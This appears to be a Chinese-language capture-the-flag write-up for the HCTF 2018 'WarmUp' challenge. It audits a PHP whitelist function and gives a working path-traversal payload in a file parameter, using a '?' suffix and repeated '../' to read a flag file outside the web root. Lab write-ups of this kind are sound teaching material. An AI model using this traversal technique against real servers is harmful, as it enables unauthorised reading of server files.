# ctf-

[HCTF 2018]WarmUp原题复现

1. 打开题目环境，发现什么都没有，那么__查看源代码__

![image](https://user-images.githubusercontent.com/76896357/116090405-6903c900-a6d6-11eb-9664-2195eee0f066.png)

2. 打开那个文件，发现是要代码审计
![image](https://user-images.githubusercontent.com/76896357/116090877-e7f90180-a6d6-11eb-98b2-625dc09e5db7.png)


!empty($_REQUEST['file'])  # 要求file变量不能为空

is_string($_REQUEST['file'])    # 要求字符串变量是字符型

emmm::checkFile($_REQUEST['file'])  # 调用emmm类里面的checkFile函数

3. 审查函数代码

看见了新的文件，打开看一下

![image](https://user-images.githubusercontent.com/76896357/116103473-32cc4680-a6e2-11eb-8117-4e44d42635b2.png)


```
class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];    # 定义数组
            if (! isset($page) || !is_string($page)) {                   # 检查参数存不存在，并且是不是字符串
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {                          # 如果参数被包括在数组内部，直接返回，这里可以知道参数是不能直接包含上面两个文件的
                return true;
            }

            $_page = mb_substr(                                         # 构建$_page变量，截取$page从开头到?的字母
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {                         # 如果匹配到白名单，返回true
                return true;
            }

            $_page = urldecode($page);                                  # 对截取的字符串解码
            $_page = mb_substr(                                         # 看看解码后是否存在？
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {                        # 存在就返回
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
```
![image](https://user-images.githubusercontent.com/76896357/116098860-fac30480-a6dd-11eb-9c99-6b95c68f063c.png)


现在可以构建payload:

```
http://eec73ef7-5280-4697-b5ec-56d5a6b8bfb3.node3.buuoj.cn/index.php?file=source.php?/ffffllllaaaagggg.php
```
发现不行，猜测文件可能是在根目录，又发现，下面图片的地址。。。

![image](https://user-images.githubusercontent.com/76896357/116111450-3dd6a500-a6e9-11eb-8959-a34cf8b970f7.png)


试试吧，就不停的../吧！！！

```
http://eec73ef7-5280-4697-b5ec-56d5a6b8bfb3.node3.buuoj.cn/index.php?file=hint.php?/../../../../../ffffllllaaaagggg
```

5个../就行，多了也可以

![image](https://user-images.githubusercontent.com/76896357/116111325-1f70a980-a6e9-11eb-939d-2c5bd24dfc25.png)

成功！！！









































